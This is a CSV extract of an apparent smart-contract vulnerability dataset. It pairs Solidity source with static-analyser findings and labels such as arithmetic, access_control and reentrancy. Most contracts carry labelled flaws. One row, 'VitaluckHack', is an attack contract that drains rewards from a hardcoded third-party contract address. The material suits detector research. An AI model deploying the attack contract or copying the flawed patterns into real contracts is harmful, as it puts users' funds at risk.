,address,tools,lines,nb_vulnerabilities,source_code,vulnerability_category_labels,md5_hash,scores,accepted_labels,token_count
2471,0x52a4b11b23587467b54a49ec0ccb47436526f714,"{'mythril': {'vulnerabilities': {'Exception state': 5, 'Integer Overflow': 1}, 'categories': {'Other': 5, 'arithmetic': 1}}, 'slither': {'vulnerabilities': {}, 'categories': {}}, 'oyente': {'vulnerabilities': {'Integer Overflow.': 1}, 'categories': {'arithmetic': 1}}, 'osiris': {'vulnerabilities': {'overflow_bugs': 2}, 'categories': {'arithmetic': 2}}, 'smartcheck': {'vulnerabilities': {}, 'categories': {}}, 'securify': {'vulnerabilities': {'TODTransfer': 1, 'TODAmount': 1}, 'categories': {'front_running': 2}}, 'honeybadger': {'vulnerabilities': {}, 'categories': {}}}","[1, 3, 37, 6, 9, 47, 49, 55, 57]",11,"pragma solidity ^0.4.21; contract DoacaoEvento { address public responsavel; enum StatusDoacao{ABERTO, FECHADO, SACADO} StatusDoacao public statusDoacao; address public ong; Doador[] public doadores; event LogDoacaoRecebida(address doador, uint256 value); event LogSaqueEfetuado(uint dataHora); event LogOngInformada(address doador); struct Doador { address doador; uint256 valor; uint256 dataHora; } function DoacaoEvento() public { responsavel = msg.sender; statusDoacao = StatusDoacao.ABERTO; } modifier apenasResponsavel() { require(msg.sender == responsavel); _; } function informarOng(address _ong) public apenasResponsavel { emit LogOngInformada(_ong); ong = _ong; } function fecharDoacoes() public apenasResponsavel { require(statusDoacao == StatusDoacao.ABERTO); statusDoacao = StatusDoacao.FECHADO; } function abrirDoacoes() public apenasResponsavel { statusDoacao = StatusDoacao.ABERTO; } function sacarDoacoes() public { require(msg.sender == ong && address(this).balance > 0 && statusDoacao == StatusDoacao.FECHADO); statusDoacao = StatusDoacao.SACADO; emit LogSaqueEfetuado(block.timestamp); msg.sender.transfer(address(this).balance); } function() public payable { require(msg.value > 0 && statusDoacao == StatusDoacao.ABERTO); emit LogDoacaoRecebida(msg.sender, msg.value); Doador memory d = Doador(msg.sender, msg.value, block.timestamp); doadores.push(d); } }","{'other', 'front_running', 'arithmetic'}",4cb70861b89260152a53f6df56d99c1b,"{'access_control': 0.0, 'arithmetic': np.float64(0.688514475437834), 'denial_service': 0.0, 'front_running': np.float64(0.15965746899845826), 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': np.float64(0.1111111111111111), 'clean': 0.5555555555555556}","{'other', 'front_running', 'arithmetic'}",473
2472,0x51d0cfa6fc1be1df18cd4ea38c6e45751908c356,"{'mythril': {'vulnerabilities': {'Integer Overflow': 6}, 'categories': {'arithmetic': 6}}, 'slither': {'vulnerabilities': {}, 'categories': {}}, 'oyente': {'vulnerabilities': {'Integer Underflow.': 1, 'Integer Overflow.': 1}, 'categories': {'arithmetic': 2}}, 'osiris': {'vulnerabilities': {}, 'categories': {}}, 'smartcheck': {'vulnerabilities': {}, 'categories': {}}, 'securify': {'vulnerabilities': {}, 'categories': {}}, 'honeybadger': {'vulnerabilities': {}, 'categories': {}}}","[4, 3, 12, 20]",8,"pragma solidity 0.4.25; contract SLoader { mapping (address => Package) public packages; struct Package{ bytes32 checksum; string uri; } function registerPackage(bytes32 checksum, string uri) public { packages[msg.sender] = Package(checksum, uri); } function checksum(address sl_dapp) constant public returns (bytes32) { return packages[sl_dapp].checksum; } function uri(address sl_dapp) constant public returns (string) { return packages[sl_dapp].uri; } }",{'arithmetic'},45ab1f3395bc831be9a29e5f86e8acf6,"{'access_control': 0.0, 'arithmetic': np.float64(0.4809315912786981), 'denial_service': 0.0, 'front_running': 0.0, 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': 0.0, 'clean': 0.7777777777777778}",{'arithmetic'},130
2473,0x51ae2f91619246ad3a20f4e76f3323a836bde6a5,"{'mythril': {'vulnerabilities': {'Integer Overflow': 10, 'Use of tx.origin': 1}, 'categories': {'arithmetic': 10, 'access_control': 1}}, 'slither': {'vulnerabilities': {}, 'categories': {}}, 'oyente': {'vulnerabilities': {'Integer Overflow.': 1}, 'categories': {'arithmetic': 1}}, 'osiris': {'vulnerabilities': {}, 'categories': {}}, 'smartcheck': {'vulnerabilities': {}, 'categories': {}}, 'securify': {'vulnerabilities': {'TODAmount': 1}, 'categories': {'front_running': 1}}, 'honeybadger': {'vulnerabilities': {}, 'categories': {}}}","[12, 15, 19, 22, 24]",13,pragma solidity ^0.4.24; contract MultiFundsWallet { bytes32 keyHash; address owner; constructor() public { owner = msg.sender; } function setup(string key) public { if (keyHash == 0x0) { keyHash = keccak256(abi.encodePacked(key)); } } function withdraw(string key) public payable { require(msg.sender == tx.origin); if(keyHash == keccak256(abi.encodePacked(key))) { if(msg.value > 0.1 ether) { msg.sender.transfer(address(this).balance); } } } function update(bytes32 _keyHash) public { if (keyHash == 0x0) { keyHash = _keyHash; } } function clear() public { require(msg.sender == owner); selfdestruct(owner); } function () public payable { } },"{'access_control', 'front_running', 'arithmetic'}",fca829318d93d145d051407a27dfab02,"{'access_control': np.float64(0.14446405201872123), 'arithmetic': np.float64(0.4809315912786981), 'denial_service': 0.0, 'front_running': np.float64(0.15965746899845826), 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': 0.0, 'clean': 0.6666666666666666}","{'front_running', 'access_control', 'arithmetic'}",202
2474,0x51170b18bca7896b49c52dcc18e66e5c921e100f,"{'mythril': {'vulnerabilities': {}, 'categories': {}}, 'slither': {'vulnerabilities': {'calls-loop': 1}, 'categories': {'denial_service': 1}}, 'oyente': {'vulnerabilities': {'Integer Underflow.': 1, 'Integer Overflow.': 1, 'Callstack Depth Attack Vulnerability.': 1}, 'categories': {'arithmetic': 2, 'denial_service': 1}}, 'osiris': {'vulnerabilities': {'callstack_bug': 1}, 'categories': {'denial_service': 1}}, 'smartcheck': {'vulnerabilities': {'SOLIDITY_ARRAY_LENGTH_MANIPULATION': 1, 'SOLIDITY_GAS_LIMIT_IN_LOOPS': 1}, 'categories': {'arithmetic': 1, 'denial_service': 1}}, 'securify': {'vulnerabilities': {}, 'categories': {}}, 'honeybadger': {'vulnerabilities': {}, 'categories': {}}}","[64, 47, 20, 53, 28, 61]",7,"contract CrystalDoubler { struct InvestorArray { address EtherAddress; uint Amount; } InvestorArray[] public depositors; uint public Total_Players=0; uint public Balance = 0; uint public Total_Deposited=0; uint public Total_Paid_Out=0; string public Message=""Welcome Player! Double your ETH Now!""; address public owner; function CrystalDoubler() { owner = msg.sender; } function() { enter(); } function enter() { if (msg.value > 500 finney) { uint Amount=msg.value; Total_Players=depositors.length+1; depositors.length += 1; depositors[depositors.length-1].EtherAddress = msg.sender; depositors[depositors.length-1].Amount = Amount; Balance += Amount; Total_Deposited+=Amount; uint payout; uint nr=0; while (Balance > depositors[nr].Amount * 200/100 && nr<Total_Players) { payout = depositors[nr].Amount *200/100; depositors[nr].EtherAddress.send(payout); Balance -= depositors[nr].Amount *200/100; Total_Paid_Out += depositors[nr].Amount *200/100; } } } }","{'denial_service', 'arithmetic'}",e876bbf5f2c7623c0d42e3a1d416eace,"{'access_control': 0.0, 'arithmetic': np.float64(0.3392479920555724), 'denial_service': np.float64(0.8303315366365432), 'front_running': 0.0, 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': 0.0, 'clean': 0.5555555555555556}","{'denial_service', 'arithmetic'}",282
2475,0x4f09ea83feed21cca65f51a4caae1e6d212f5c50,"{'mythril': {'vulnerabilities': {}, 'categories': {}}, 'slither': {'vulnerabilities': {}, 'categories': {}}, 'oyente': {'vulnerabilities': {'Integer Underflow.': 1}, 'categories': {'arithmetic': 1}}, 'osiris': {'vulnerabilities': {}, 'categories': {}}, 'smartcheck': {'vulnerabilities': {}, 'categories': {}}, 'securify': {'vulnerabilities': {}, 'categories': {}}, 'honeybadger': {'vulnerabilities': {}, 'categories': {}}}",[5],1,"contract BOXICOIN { string public standard = 'Token 0.1'; string public name; string public symbol; uint8 public decimals; uint256 public initialSupply; uint256 public totalSupply; mapping (address => uint256) public balanceOf; mapping (address => mapping (address => uint256)) public allowance; function BOXICOIN() { initialSupply = 10000000000; name =""BOXICOIN""; decimals = 2; symbol = ""BXC""; balanceOf[msg.sender] = initialSupply; totalSupply = initialSupply; } function transfer(address _to, uint256 _value) { if (balanceOf[msg.sender] < _value) throw; if (balanceOf[_to] + _value < balanceOf[_to]) throw; balanceOf[msg.sender] -= _value; balanceOf[_to] += _value; } function () { throw; } }",{'arithmetic'},a589c9c179ca1cf8625340210bbac758,"{'access_control': 0.0, 'arithmetic': np.float64(0.220970829953588), 'denial_service': 0.0, 'front_running': 0.0, 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': 0.0, 'clean': 0.8888888888888888}",{'arithmetic'},202
2476,0x4df437a667c1c502dd54206fdf66a376b65b6ecb,"{'mythril': {'vulnerabilities': {}, 'categories': {}}, 'slither': {'vulnerabilities': {}, 'categories': {}}, 'oyente': {'vulnerabilities': {'Integer Underflow.': 1}, 'categories': {'arithmetic': 1}}, 'osiris': {'vulnerabilities': {}, 'categories': {}}, 'smartcheck': {'vulnerabilities': {}, 'categories': {}}, 'securify': {'vulnerabilities': {}, 'categories': {}}, 'honeybadger': {'vulnerabilities': {}, 'categories': {}}}",[4],1,"contract MOM { string public standard = 'Token 0.1'; string public name; string public symbol; uint8 public decimals; uint256 public initialSupply; uint256 public totalSupply; mapping (address => uint256) public balanceOf; mapping (address => mapping (address => uint256)) public allowance; function MOM() { initialSupply = 50000; name =""MobileMoney""; decimals = 2; symbol = ""MOM""; balanceOf[msg.sender] = initialSupply; totalSupply = initialSupply; } function transfer(address _to, uint256 _value) { if (balanceOf[msg.sender] < _value) throw; if (balanceOf[_to] + _value < balanceOf[_to]) throw; balanceOf[msg.sender] -= _value; balanceOf[_to] += _value; } function () { throw; } }",{'arithmetic'},c8cbaca9462e6ee35299de43242db8f9,"{'access_control': 0.0, 'arithmetic': np.float64(0.220970829953588), 'denial_service': 0.0, 'front_running': 0.0, 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': 0.0, 'clean': 0.8888888888888888}",{'arithmetic'},198
2477,0x4cd29dc84fb19c205b65e7cba71bb2fc4478553f,"{'mythril': {'vulnerabilities': {}, 'categories': {}}, 'slither': {'vulnerabilities': {}, 'categories': {}}, 'oyente': {'vulnerabilities': {'Integer Underflow.': 1}, 'categories': {'arithmetic': 1}}, 'osiris': {'vulnerabilities': {}, 'categories': {}}, 'smartcheck': {'vulnerabilities': {}, 'categories': {}}, 'securify': {'vulnerabilities': {}, 'categories': {}}, 'honeybadger': {'vulnerabilities': {}, 'categories': {}}}",[6],1,"pragma solidity ^0.4.2; contract CardanoDark { string public standard = 'Token 0.1'; string public name; string public symbol; uint8 public decimals; uint256 public initialSupply; uint256 public totalSupply; mapping (address => uint256) public balanceOf; mapping (address => mapping (address => uint256)) public allowance; function CardanoDark() { initialSupply = 1000000000000000; name =""Cardano Dark""; decimals = 8; symbol = ""ADAD""; balanceOf[msg.sender] = initialSupply; totalSupply = initialSupply; } function transfer(address _to, uint256 _value) { if (balanceOf[msg.sender] < _value) throw; if (balanceOf[_to] + _value < balanceOf[_to]) throw; balanceOf[msg.sender] -= _value; balanceOf[_to] += _value; } function () { throw; } }",{'arithmetic'},96ff45b641b0d1bc6ed4d275de8bb93b,"{'access_control': 0.0, 'arithmetic': np.float64(0.220970829953588), 'denial_service': 0.0, 'front_running': 0.0, 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': 0.0, 'clean': 0.8888888888888888}",{'arithmetic'},214
2478,0x4b9d8e37bd266fe27adc45a31a6e1c2b9ca18737,"{'mythril': {'vulnerabilities': {'Integer Overflow': 14, 'Use of tx.origin': 1, 'Integer Underflow': 1}, 'categories': {'arithmetic': 15, 'access_control': 1}}, 'slither': {'vulnerabilities': {'arbitrary-send': 1}, 'categories': {'access_control': 1}}, 'oyente': {'vulnerabilities': {'Integer Underflow.': 1, 'Integer Overflow.': 1}, 'categories': {'arithmetic': 2}}, 'osiris': {'vulnerabilities': {}, 'categories': {}}, 'smartcheck': {'vulnerabilities': {'SOLIDITY_GAS_LIMIT_IN_LOOPS': 1}, 'categories': {'denial_service': 1}}, 'securify': {'vulnerabilities': {}, 'categories': {}}, 'honeybadger': {'vulnerabilities': {}, 'categories': {}}}","[32, 3, 5, 38, 7, 9, 21, 24, 28]",20,"pragma solidity ^0.4.25; contract E_GAME { function Try(string _response) external payable { require(msg.sender == tx.origin); if(responseHash == keccak256(_response) && msg.value > 1 ether) { msg.sender.transfer(this.balance); } } string public question; bytes32 responseHash; mapping (bytes32=>bool) admin; function Start(string _question, string _response) public payable isAdmin{ if(responseHash==0x0){ responseHash = keccak256(_response); question = _question; } } function Stop() public payable isAdmin { msg.sender.transfer(this.balance); } function New(string _question, bytes32 _responseHash) public payable isAdmin { question = _question; responseHash = _responseHash; } constructor(bytes32[] admins) public{ for(uint256 i=0; i< admins.length; i++){ admin[admins[i]] = true; } } modifier isAdmin(){ require(admin[keccak256(msg.sender)]); _; } function() public payable{} }","{'denial_service', 'access_control', 'arithmetic'}",359cc1cbdc6e3cfb0077ade14d41899e,"{'access_control': np.float64(0.28892810403744246), 'arithmetic': np.float64(0.4809315912786981), 'denial_service': np.float64(0.2075828841591358), 'front_running': 0.0, 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': 0.0, 'clean': 0.5555555555555556}","{'denial_service', 'access_control', 'arithmetic'}",252
2479,0x4b2b60175b6e070e456816fda2b01a72343d66ca,"{'mythril': {'vulnerabilities': {}, 'categories': {}}, 'slither': {'vulnerabilities': {}, 'categories': {}}, 'oyente': {'vulnerabilities': {}, 'categories': {}}, 'osiris': {'vulnerabilities': {'reentrancy_bug': 1}, 'categories': {'reentrancy': 1}}, 'smartcheck': {'vulnerabilities': {}, 'categories': {}}, 'securify': {'vulnerabilities': {}, 'categories': {}}, 'honeybadger': {'vulnerabilities': {}, 'categories': {}}}",[22],1,"contract VitaluckHack{ bool locked = true; address owner = msg.sender; function() public payable { if (locked){ revert(); } } function setlock(bool what){ require(msg.sender == owner); locked = what; } function go() public payable { Vitaluck Target = Vitaluck(0xB36A7CD3f5d3e09045D765b661aF575e3b5AF24A); Target.Press.value(msg.value)(1, 0); } function get(){ setlock(false); Vitaluck Target = Vitaluck(0xB36A7CD3f5d3e09045D765b661aF575e3b5AF24A); Target.withdrawReward(); address(0x98081ce968E5643c15de9C024dE96b18BE8e5aCe).transfer(address(this).balance/2); address(owner).transfer(address(this).balance); } } interface Vitaluck{ function withdrawReward() public; function Press(uint a, uint b) public payable; }",{'reentrancy'},5a48888c6f77916b88faeef0a51fb256,"{'access_control': 0.0, 'arithmetic': 0.0, 'denial_service': 0.0, 'front_running': 0.0, 'reentrancy': np.float64(0.2411769030203825), 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': 0.0, 'clean': 0.8888888888888888}",{'reentrancy'},240
2480,0x4ada9ae7e255449f333c59740cc44f8e9ca7ff1f,"{'mythril': {'vulnerabilities': {}, 'categories': {}}, 'slither': {'vulnerabilities': {}, 'categories': {}}, 'oyente': {'vulnerabilities': {}, 'categories': {}}, 'osiris': {'vulnerabilities': {}, 'categories': {}}, 'smartcheck': {'vulnerabilities': {}, 'categories': {}}, 'securify': {'vulnerabilities': {}, 'categories': {}}, 'honeybadger': {'vulnerabilities': {}, 'categories': {}}}",[],0,"pragma solidity ^0.4.11; contract ForklogBlockstarter { string public constant contract_md5 = ""847df4b1ba31f28b9399b52d784e4a8e""; string public constant contract_sha256 = ""cd195ff7ac4743a1c878f0100e138e36471bb79c0254d58806b8244080979116""; mapping (address => bool) private signs; address private alex = 0x8D5bd2aBa04A07Bfa0cc976C73eD45B23cC6D6a2; address private andrey = 0x688d12D97D0E480559B6bEB6EE9907B625c14Adb; address private toly = 0x34972356Af9B8912c1DC2737fd43352A8146D23D; address private eugene = 0x259BBd479Bd174129a3ccb007f608D52cd2630e9; function() { sing(); } function sing() { singBy(msg.sender); } function singBy(address signer) { if (isSignedBy(signer)) return; signs[signer] = true; } function isSignedBy(address signer) constant returns (bool) { return signs[signer] == true; } function isSignedByAlex() constant returns (bool) { return isSignedBy(alex); } function isSignedByAndrey() constant returns (bool) { return isSignedBy(andrey); } function isSignedByToly() constant returns (bool) { return isSignedBy(toly); } function isSignedByEugene() constant returns (bool) { return isSignedBy(eugene); } function isSignedByAll() constant returns (bool) { return ( isSignedByAlex() && isSignedByAndrey() && isSignedByToly() && isSignedByEugene() ); } }",set(),240b4fb08493b35ffea4c8b0602d6b57,"{'access_control': 0.0, 'arithmetic': 0.0, 'denial_service': 0.0, 'front_running': 0.0, 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': 0.0, 'clean': 1.0}",{'clean'},458
